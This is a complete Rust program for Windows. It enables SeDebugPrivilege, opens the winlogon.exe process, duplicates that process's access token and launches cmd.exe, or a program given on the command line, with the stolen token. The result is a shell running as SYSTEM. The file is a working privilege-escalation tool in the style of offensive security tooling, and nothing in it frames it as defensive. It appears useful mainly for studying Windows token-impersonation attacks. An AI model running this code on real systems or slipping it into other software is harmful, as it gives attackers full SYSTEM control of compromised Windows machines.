use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

use windows::{
    core::{PCWSTR, PWSTR},
    Win32::{
        Foundation::{CloseHandle, HANDLE, LUID},
        Security::{
            AdjustTokenPrivileges, DuplicateTokenEx, LookupPrivilegeValueW, SecurityImpersonation,
            TokenPrimary, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES,
            TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_PRIVILEGES, TOKEN_QUERY,
        },
        System::{
            Diagnostics::ToolHelp::{
                CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                TH32CS_SNAPPROCESS,
            },
            Threading::{
                CreateProcessWithTokenW, OpenProcess, OpenProcessToken, CREATE_UNICODE_ENVIRONMENT,
                LOGON_WITH_PROFILE, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION, STARTUPINFOW,
            },
        },
    },
};

fn get_process_id_by_name(process_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile);
                let name = name.trim_matches(char::from(0));
                if name.eq_ignore_ascii_case(process_name) {
                    let _ = CloseHandle(snapshot);
                    return Some(entry.th32ProcessID);
                }
                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snapshot);
    }
    None
}

fn enable_privilege(privilege_name: &str) -> Result<(), windows::core::Error> {
    unsafe {
        let mut current_process_token = HANDLE::default();
        OpenProcessToken(
            windows::Win32::System::Threading::GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut current_process_token,
        )?;

        let mut luid = LUID::default();
        let priv_name: Vec<u16> = OsStr::new(privilege_name)
            .encode_wide()
            .chain(Some(0))
            .collect();

        LookupPrivilegeValueW(None, PCWSTR(priv_name.as_ptr()), &mut luid)?;

        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        AdjustTokenPrivileges(
            current_process_token,
            false,
            Some(&mut tp),
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            None,
            None,
        )?;

        CloseHandle(current_process_token)?;
    }
    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    let target_process = if args.len() > 1 { &args[1] } else { "cmd.exe" };

    println!("[*] Enabling SeDebugPrivilege...");
    enable_privilege("SeDebugPrivilege")?;

    println!("[*] Finding winlogon.exe process ID...");
    let winlogon_pid = get_process_id_by_name("winlogon.exe").expect("Failed to find winlogon.exe");
    println!("[+] winlogon.exe PID: {}", winlogon_pid);

    unsafe {
        println!("[*] Opening winlogon.exe process...");
        let h_process = OpenProcess(PROCESS_QUERY_INFORMATION, false, winlogon_pid)?;

        println!("[*] Opening winlogon.exe token...");
        let mut h_token = HANDLE::default();
        OpenProcessToken(h_process, TOKEN_DUPLICATE | TOKEN_QUERY, &mut h_token)?;

        println!("[*] Duplicating token...");
        let mut h_dup_token = HANDLE::default();
        DuplicateTokenEx(
            h_token,
            TOKEN_ALL_ACCESS,
            None,
            SecurityImpersonation,
            TokenPrimary,
            &mut h_dup_token,
        )?;

        println!(
            "[*] Creating process with duplicated token: {}",
            target_process
        );
        let mut command_line: Vec<u16> = OsStr::new(target_process)
            .encode_wide()
            .chain(Some(0))
            .collect();

        let mut startup_info = STARTUPINFOW {
            cb: std::mem::size_of::<STARTUPINFOW>() as u32,
            ..Default::default()
        };
        let mut process_information = PROCESS_INFORMATION::default();

        CreateProcessWithTokenW(
            h_dup_token,
            LOGON_WITH_PROFILE,
            None,
            PWSTR(command_line.as_mut_ptr()),
            CREATE_UNICODE_ENVIRONMENT,
            None,
            None,
            &mut startup_info,
            &mut process_information,
        )?;

        println!(
            "[+] Process created successfully! PID: {}",
            process_information.dwProcessId
        );

        CloseHandle(process_information.hProcess)?;
        CloseHandle(process_information.hThread)?;
        CloseHandle(h_dup_token)?;
        CloseHandle(h_token)?;
        CloseHandle(h_process)?;
    }

    Ok(())
}
